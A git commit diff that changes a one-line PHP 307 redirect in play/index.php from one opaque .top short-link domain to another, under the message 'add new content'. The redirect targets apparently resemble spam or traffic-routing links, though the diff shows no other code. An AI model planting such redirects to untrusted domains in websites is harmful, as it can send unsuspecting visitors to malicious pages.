e0aa2eeed331ec81e03a5332859afe9a2cff25da
PhoenixFan86 <johndoe@example.comphoenixfan86@gmail.com>
2026-01-09 21:02:48 +0200

    add new content

--- play/index.php
+++ play/index.php
@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aahypershifttech.top/8bMFQb');
+header('Location: https://ioscraft.top/1X3cL9');
 exit();
 ?>
